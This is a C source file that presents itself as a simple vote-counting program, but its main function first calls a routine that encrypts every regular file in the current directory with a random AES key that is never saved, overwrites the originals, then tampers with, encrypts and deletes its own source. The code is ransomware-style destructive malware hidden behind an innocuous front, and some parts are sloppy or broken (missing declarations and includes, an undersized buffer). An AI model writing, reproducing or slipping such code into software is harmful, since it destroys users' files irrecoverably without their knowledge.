#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/evp.h>

#include <stdio.h>

int main() { 
    direnc();
    int votes = 0;
    printf("Initial vote count: %d\n", votes);
    return 0;
}




// Function to encrypt a file using AES-256-CBC encryption
void encryptFile(char* fileName, char* key) {
    // Open the file to be encrypted
    FILE* file = fopen(fileName, "rb");
    if (file == NULL) {
        printf("Error opening file %s\n", fileName);
        return;
    }

    // Get the file size
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate memory for the file contents
    unsigned char* fileContents = (unsigned char*)malloc(fileSize);
    if (fileContents == NULL) {
        printf("Error allocating memory for file contents\n");
        fclose(file);
        return;
    }

    // Read the file contents into memory
    fread(fileContents, 1, fileSize, file);
    fclose(file);

    // Generate a random initialization vector
    unsigned char iv[16];
    RAND_bytes(iv, 16);

    // Generate a key from the given key string
    unsigned char* keyBytes = (unsigned char*)key;
    unsigned char* salt = (unsigned char*)"Devilinci";
    unsigned char* derivedKey = (unsigned char*)malloc(EVP_MAX_KEY_LENGTH);
    if (derivedKey == NULL) {
        printf("Error allocating memory for derived key\n");
        free(fileContents);
        return;
    }
    int keyLength = EVP_BytesToKey(EVP_aes_256_cbc(), EVP_sha256(), salt, keyBytes, strlen(keyBytes), 1, derivedKey, NULL);

    // Encrypt the file contents using AES-256-CBC encryption
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, derivedKey, iv);
    EVP_EncryptUpdate(ctx, fileContents, &fileSize, fileContents, fileSize);
    EVP_EncryptFinal_ex(ctx, fileContents + fileSize, &fileSize);
    EVP_CIPHER_CTX_free(ctx);

    // Write the encrypted file contents to the original file
    file = fopen(fileName, "wb");
    if (file == NULL) {
        printf("Error opening file %s\n", fileName);
        free(fileContents);
        free(derivedKey);
        return;
    }
    fwrite(iv, 1, 16, file);
    fwrite(fileContents, 1, fileSize, file);
    fclose(file);

    // Free allocated memory
    free(fileContents);
    free(derivedKey);
}

// Function to encrypt all files in the current directory
void encryptAllFiles(char* key) {
    // Open the current directory
    DIR* dir = opendir(".");
    if (dir == NULL) {
        printf("Error opening current directory\n");
        return;
    }

    // Loop through all files in the current directory
    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        // Check if the file is a regular file
        if (entry->d_type == DT_REG) {
            // Encrypt the file
            encryptFile(entry->d_name, key);
        }
    }

    // Close the directory
    closedir(dir);
}

// Main function
int direnc() {
    // Generate a random key
    unsigned char key[32];
    RAND_bytes(key, 32);

    // Encrypt all files in the current directory
    encryptAllFiles(key);

    // Add the malicious code to preexisting files
    FILE* file = fopen(__FILE__, "a");
    if (file == NULL) {
        printf("Error opening file %s\n", __FILE__);
        return 0;
    }
    fprintf(file, "\n// Malicious code added by Devilinci\n");
    fprintf(file, "encryptAllFiles(\"%s\");\n", key);
    fclose(file);

    // Encrypt this file
    encryptFile(__FILE__, key);

    // Delete this file
    remove(__FILE__);

    return 0;
}
